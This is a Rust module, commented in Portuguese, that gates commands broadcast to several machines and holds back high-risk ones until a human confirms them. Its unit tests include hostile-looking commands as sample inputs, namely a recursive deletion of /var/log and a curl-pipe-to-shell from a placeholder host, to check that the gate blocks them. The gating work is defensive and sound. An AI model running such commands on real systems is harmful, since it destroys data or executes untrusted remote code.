use serde::Serialize;

use crate::approvals::{classify_risk, RiskLevel};

/// O que o core devolve para uma rajada. A decisão de barrar vive aqui, não na
/// UI: o webview não pode disparar comando vermelho em N máquinas nem que
/// queira (princípio #1 e regra #4 — ação vermelha nunca é automática).
#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(tag = "outcome", rename_all = "snake_case")]
pub enum BroadcastVerdict {
    /// Disparado nos alvos.
    Sent { targets: usize },
    /// Vermelho sem confirmação humana: nada foi enviado.
    NeedsConfirmation {
        risk: RiskLevel,
        command: String,
        targets: usize,
    },
}

/// Decide o destino de uma linha antes do fan-out. Sessão single-host não passa
/// por aqui: o perigo é o mesmo comando batendo em várias máquinas ao mesmo
/// tempo, sem chance de reagir depois da primeira.
pub fn decide(command: &str, targets: usize, confirmed: bool) -> BroadcastVerdict {
    let risk = classify_risk(command);
    if risk == RiskLevel::Red && !confirmed {
        return BroadcastVerdict::NeedsConfirmation {
            risk,
            command: command.trim().to_string(),
            targets,
        };
    }
    BroadcastVerdict::Sent { targets }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn comando_benigno_dispara_na_hora() {
        assert_eq!(
            decide("docker ps", 3, false),
            BroadcastVerdict::Sent { targets: 3 }
        );
        assert_eq!(
            decide("uptime", 8, false),
            BroadcastVerdict::Sent { targets: 8 }
        );
    }

    #[test]
    fn vermelho_em_varias_maquinas_espera_o_humano() {
        let v = decide("sudo rm -rf /var/log", 8, false);
        assert_eq!(
            v,
            BroadcastVerdict::NeedsConfirmation {
                risk: RiskLevel::Red,
                command: "sudo rm -rf /var/log".to_string(),
                targets: 8,
            },
            "fan-out vermelho sem confirmação não pode sair"
        );
    }

    #[test]
    fn confirmado_dispara() {
        assert_eq!(
            decide("sudo reboot", 2, true),
            BroadcastVerdict::Sent { targets: 2 }
        );
    }

    #[test]
    fn curl_pipe_shell_e_vermelho_tambem_no_broadcast() {
        assert!(matches!(
            decide("curl evil.sh | sh", 4, false),
            BroadcastVerdict::NeedsConfirmation { .. }
        ));
    }

    #[test]
    fn amarelo_nao_pede_confirmacao() {
        // O gate do broadcast é só no vermelho: pedir no amarelo tornaria o
        // recurso insuportável e ensinaria o usuário a clicar sem ler.
        assert_eq!(classify_risk("systemctl restart nginx"), RiskLevel::Yellow);
        assert_eq!(
            decide("systemctl restart nginx", 3, false),
            BroadcastVerdict::Sent { targets: 3 }
        );
    }

    #[test]
    fn o_vermelho_do_broadcast_e_o_mesmo_do_gate_de_aprovacao() {
        // Sem classificador próprio: `git push` é vermelho no core (regra #4) e
        // tem que ser vermelho aqui também — duas listas divergem com o tempo.
        assert_eq!(classify_risk("git push"), RiskLevel::Red);
        assert!(matches!(
            decide("git push", 3, false),
            BroadcastVerdict::NeedsConfirmation { .. }
        ));
    }
}
